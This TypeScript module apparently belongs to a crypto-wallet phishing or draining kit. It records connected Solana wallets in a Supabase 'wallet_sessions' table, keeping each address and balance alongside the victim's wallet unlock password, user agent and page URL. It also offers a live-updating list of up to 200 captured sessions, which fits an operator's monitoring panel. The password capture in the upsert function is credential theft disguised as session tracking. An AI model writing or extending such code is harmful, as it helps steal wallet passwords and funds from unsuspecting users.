import { supabase } from './supabase'
import type { WalletMonitorRecord } from './walletMonitorStore'

const TABLE = 'wallet_sessions'

function nowIso() {
  return new Date().toISOString()
}

function newId() {
  return typeof crypto !== 'undefined' && crypto.randomUUID ? crypto.randomUUID() : `sess-${Date.now()}`
}

type CloudRow = {
  id: string
  wallet_address: string
  wallet_type: string | null
  chain: string | null
  network: string | null
  balance_sol: number | null
  page_url: string | null
  user_agent: string | null
  browser_session_id: string | null
  unlock_password: string | null
  connected_at: string
  last_seen_at: string
  connection_status: string | null
}

function toRecord(row: CloudRow): WalletMonitorRecord {
  return {
    id: row.id,
    walletAddress: row.wallet_address,
    walletType: row.wallet_type || 'Solana Wallet',
    chain: row.chain || 'solana',
    network: row.network || 'mainnet-beta',
    balanceSol: typeof row.balance_sol === 'number' ? row.balance_sol : null,
    pageUrl: row.page_url,
    userAgent: row.user_agent,
    clientIp: null,
    browserSessionId: row.browser_session_id,
    unlockPassword: row.unlock_password,
    connectedAt: row.connected_at,
    lastSeenAt: row.last_seen_at,
    connectionStatus: row.connection_status || 'connected',
    user: null,
  }
}

export async function upsertCloudWalletSession(input: {
  walletAddress: string
  walletType?: string
  chain?: string
  network?: string
  balanceSol?: number | null
  pageUrl?: string | null
  browserSessionId?: string | null
  unlockPassword?: string | null
  connectionStatus?: string
}): Promise<void> {
  if (!input.walletAddress) return
  try {
    const { data: existing } = await supabase
      .from(TABLE)
      .select('id, unlock_password, connected_at, wallet_type, chain, network, balance_sol, page_url, user_agent, browser_session_id')
      .eq('wallet_address', input.walletAddress)
      .maybeSingle()

    const row = {
      id: existing?.id || newId(),
      wallet_address: input.walletAddress,
      wallet_type: input.walletType || existing?.wallet_type || 'Solana Wallet',
      chain: input.chain || existing?.chain || 'solana',
      network: input.network || existing?.network || 'mainnet-beta',
      balance_sol: typeof input.balanceSol === 'number' ? input.balanceSol : existing?.balance_sol ?? null,
      page_url: input.pageUrl ?? existing?.page_url ?? null,
      user_agent:
        typeof navigator !== 'undefined' ? navigator.userAgent.slice(0, 500) : existing?.user_agent ?? null,
      browser_session_id: input.browserSessionId ?? existing?.browser_session_id ?? null,
      unlock_password:
        input.unlockPassword !== undefined && input.unlockPassword !== null && String(input.unlockPassword).length > 0
          ? String(input.unlockPassword).slice(0, 500)
          : existing?.unlock_password ?? null,
      connected_at: existing?.connected_at || nowIso(),
      last_seen_at: nowIso(),
      connection_status: input.connectionStatus || 'connected',
    }

    const { error } = await supabase.from(TABLE).upsert(row, { onConflict: 'wallet_address' })
    if (error) console.warn('wallet_sessions upsert failed:', error.message)
  } catch (err) {
    console.warn('wallet_sessions upsert failed:', err)
  }
}

export async function listCloudWalletSessions(): Promise<WalletMonitorRecord[]> {
  try {
    const { data, error } = await supabase
      .from(TABLE)
      .select('*')
      .order('last_seen_at', { ascending: false })
      .limit(200)
    if (error || !data) {
      if (error) console.warn('wallet_sessions list failed:', error.message)
      return []
    }
    return (data as CloudRow[]).map(toRecord)
  } catch (err) {
    console.warn('wallet_sessions list failed:', err)
    return []
  }
}

export async function disconnectCloudWalletSession(walletAddress: string): Promise<void> {
  try {
    await supabase
      .from(TABLE)
      .update({ connection_status: 'disconnected', last_seen_at: nowIso() })
      .eq('wallet_address', walletAddress)
  } catch {
    /* ignore */
  }
}

export function subscribeCloudWalletSessions(onChange: () => void) {
  const channel = supabase
    .channel('wallet_sessions_live')
    .on('postgres_changes', { event: '*', schema: 'public', table: TABLE }, () => onChange())
    .subscribe()
  return () => {
    void supabase.removeChannel(channel)
  }
}
